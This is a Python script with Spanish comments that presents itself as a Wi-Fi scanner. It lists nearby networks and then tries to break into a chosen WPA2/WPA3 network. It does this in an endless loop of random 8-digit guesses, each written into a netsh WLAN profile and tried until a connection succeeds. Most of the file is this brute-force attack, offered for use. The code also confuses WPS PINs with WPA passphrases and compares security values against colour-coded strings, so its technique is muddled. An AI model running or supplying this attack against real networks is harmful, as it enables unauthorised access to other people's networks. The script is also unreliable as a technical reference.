import time
import pywifi
from _t_d import limpiar, stop
import win32api
import win32gui
import win32con
from progress.bar import Bar
import random
import time
import os
from colorama import init, Fore, Style

wifi_list = []

security_dict = {
    0: f"{Fore.CYAN}FREE{Fore.GREEN}",
    1: f"{Fore.YELLOW}WEP{Fore.GREEN}",
    2: f"{Fore.YELLOW}WPA{Fore.GREEN}",
    3: f"{Fore.RED}WPA2{Fore.GREEN}",
    4: f"{Fore.RED}WPA3{Fore.GREEN}",
}

def imprimir_contenido_archivo(nombre_archivo):
    try:
        with open(nombre_archivo, 'r') as archivo:
            contenido = archivo.read()
            print(contenido)
    except FileNotFoundError:
        print(f"El archivo '{nombre_archivo}' no fue encontrado.")
    except Exception as e:
        print(f"Ocurrió un error al leer el archivo: {e}")

def get_screen_resolution():
    user32 = win32api.GetSystemMetrics(0)
    user33 = win32api.GetSystemMetrics(1)
    return user32, user33

def ventana():
    window_handle = win32gui.GetForegroundWindow()
    screen_width, screen_height = get_screen_resolution()
    win32gui.MoveWindow(window_handle, 0, 0, screen_width, screen_height, True)
    win32gui.SetWindowText(window_handle, "NetAplication - WiFi-Scan")
    icon_path = "lib/data/icono.ico"
    cambiar_icono(window_handle, icon_path)

def cambiar_icono(hwnd, icon_path):
    # Cargar el archivo de icono
    icono = win32gui.LoadImage(0, icon_path, win32con.IMAGE_ICON, 0, 0, win32con.LR_LOADFROMFILE)

    # Establecer el nuevo icono para la ventana
    win32gui.SendMessage(hwnd, win32con.WM_SETICON, win32con.ICON_SMALL, icono)
    win32gui.SendMessage(hwnd, win32con.WM_SETICON, win32con.ICON_BIG, icono)

def generate_random_pin():
    return str(random.randint(0, 99999999)).zfill(8)

def connect_to_wifi_with_pin(wifi_list, selected_index):
    if 1 <= selected_index <= len(wifi_list):
        selected_wifi = wifi_list[selected_index - 1]
        ssid = selected_wifi[0]  # Nombre de la red Wi-Fi
        bssid = selected_wifi[1]  # BSSID de la red Wi-Fi
        security = selected_wifi[6]  # Seguridad de la red Wi-Fi

        # Verificar si la seguridad es WPA2 o WPA3 (otros tipos no admiten WPS PIN)
        if security in ["WPA2", "WPA3"]:
            
            # Intentar PINS WPS hasta que se establezca la conexión
            while True:
                pin_str = generate_random_pin()

                # Crear el perfil con el PIN WPS
                profile_name = "WPSProfile"
                profile_xml = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{profile_name}</name>
    <SSIDConfig>
        <SSID>
            <hex>{ssid.encode("utf-8").hex()}</hex>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{pin_str}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
                with open("lib/binc/wps_profile.xml", "w") as file:
                    file.write(profile_xml)

                # Agregar el perfil a la lista de perfiles disponibles
                add_profile_cmd = f"netsh wlan add profile filename=\"lib/binc/wps_profile.xml\""
                os.system(add_profile_cmd)
                print(f"Conectando a la red con SSID: {ssid}, BSSID: {bssid}, WPS-PING: {pin_str}")
            

                # Conectar a la red usando el perfil creado
                connect_cmd = f"netsh wlan connect name=\"{profile_name}\""
                os.system(connect_cmd)


                # Eliminar el perfil creado para el PIN actual
                delete_profile("WPSProfile")

                # Verificar si se estableció la conexión
                connected_profiles = os.popen("netsh wlan show interfaces").read()
                if f"Perfil de usuario     : {profile_name}" in connected_profiles:
                    print("¡Conexión establecida!")
                    break
                print(f"NO SE PUDO ESTABLECER LA CONEXCION WPS-PIN: {pin_str}")
                print(f"REINTENTANDO CON OTRO WPS-PIN.")
                time.sleep(1.2)
                win1()

        else:
            print("La red seleccionada no admite WPS PIN.")
            input("Presione Enter para volver a escanear las redes Wi-Fi...")
            wifi_list.clear()
            main()

    else:
        print("Índice inválido. Por favor, seleccione un índice válido de la lista.")

def scan_wifi():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    
    try:
        iface.scan()
        time.sleep(2)
        networks = iface.scan_results()
    except Exception as e:
        print(f"Error al escanear las redes Wi-Fi: {e}")
        return []

    for network in networks:
        wifi_name = network.ssid if network.ssid else "'HIDDEN'"
        bssid = network.bssid
        signal_strength = network.signal
        channel = network.channel if hasattr(network, "channel") else "N/A"
        frequency = network.freq / 1000 if hasattr(network, "freq") else "N/A"
        band, channel = get_band_and_channel_from_frequency(frequency)
        security = network.akm[0] if network.akm else "N/A"
        security_description = security_dict.get(security, "N/A")
        wifi_list.append((wifi_name, bssid, signal_strength, channel, frequency, band, security_description))

    return wifi_list

def delete_profile(profile_name):
    delete_cmd = f"netsh wlan delete profile name=\"{profile_name}\""
    os.system(delete_cmd)

def get_band_and_channel_from_frequency(frequency):
    if 2412 <= frequency <= 2484:
        channel = (frequency - 2407) // 5
        return "2.4 GHz", int(channel)
    elif 5170 <= frequency <= 5825:
        channel = (frequency - 5000) // 5
        return "5 GHz", int(channel)
    else:
        return "N/A", "N/A"

def win(nombre_archivo):
    with open(nombre_archivo, 'w') as archivo:
        archivo.write(f"{Fore.GREEN}#"*145 + "\n")
        archivo.write("{:<15}{:<25}{:<20}{:<20}{:<20}{:<20}{:<20}{:<20}".format(f"{Fore.CYAN}NUMERO", "NOMBRE", "BSSID", "SEÑAL", "CANAL", "FRECUENCIA (GHz)", "BANDA", f"SEGURIDAD{Fore.GREEN}") + "\n")
        archivo.write(f"{Fore.GREEN}#"*145 + "\n")
        for idx, (wifi_name, bssid, signal_strength, channel, frequency, band, security_description) in enumerate(wifi_list, start=1):
            line = "{:<10}{:<25}{:<20}{:<20}{:<20}{:<20}{:<20}{:<20}".format(idx, wifi_name, bssid, signal_strength, channel, frequency, band, security_description)
            archivo.write(line + "\n")
        archivo.write("#"*145 + "\n")

def win1():
    limpiar()
    imprimir_contenido_archivo("lib/binc/output")

def main():
    limpiar()
    ventana()
    wifi_list = scan_wifi()
    win("lib/binc/output")
    win1()
    selected_index = int(input("Seleccione el número de la red Wi-Fi a la que desea conectarse: "))
    print("ESTO PUEDE TARDAR, TRABAJANDO EN SEGUNDO PLANO, CUANDO SE OBTENGA LA CONEXCION EL PROGRAMA SE DETENDRA.")
    connect_to_wifi_with_pin(wifi_list, selected_index)

if __name__ == "__main__":
    main()
